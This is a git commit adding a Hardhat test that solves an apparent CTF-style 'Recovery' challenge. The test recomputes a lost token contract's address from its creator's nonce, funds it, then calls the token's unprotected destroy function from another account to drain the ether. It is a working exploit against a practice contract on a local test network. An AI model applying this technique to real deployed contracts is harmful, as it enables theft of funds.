d2d6e943e7210b723c8aa41c6afc11599d14883f
grzeznx2 <grzeznx2@gmail.com>
2023-01-06 22:04:33 +0100

    Solve Recovert challenge

---
+++ test/Recovery.spec.ts
@@ -0,0 +1,39 @@
+import { expect } from "chai";
+import { ethers,  } from "hardhat";
+const{ utils, provider, BigNumber } = ethers
+
+describe("Recovery", () => {
+  it.only("Solves the challenge", async () => {
+
+    const value = utils.parseEther('0.001')
+
+    const [deployer, destroyer] = await ethers.getSigners()
+    const contractFactory = await ethers.getContractFactory("Recovery")
+    const contract = await contractFactory.connect(deployer).deploy()
+    await contract.deployed()
+
+    const initialDestroyerBalance = await provider.getBalance(destroyer.address)
+
+    const generateTokenTx = await contract.connect(deployer).generateToken('NewSimpleToken', 10^6)
+    await generateTokenTx.wait()
+
+    const tokenContractAddress = utils.getContractAddress({from : contract.address, nonce: BigNumber.from('1')}); 
+		const token = await ethers.getContractAt("SimpleToken", tokenContractAddress);
+
+    const sendEtherTx = await deployer.sendTransaction({
+      to: token.address,
+      value
+    });
+    await sendEtherTx.wait()
+    
+    const destroyTokenTx = await token.connect(destroyer).destroy(destroyer.address)
+    await destroyTokenTx.wait()
+
+    const currentDestroyerBalance = await provider.getBalance(destroyer.address)
+
+    const destroyerBalanceDiff = currentDestroyerBalance.sub(initialDestroyerBalance)
+    
+    expect(destroyerBalanceDiff).to.be.closeTo(value, utils.parseEther('0.0001'))
+
+  });
+});
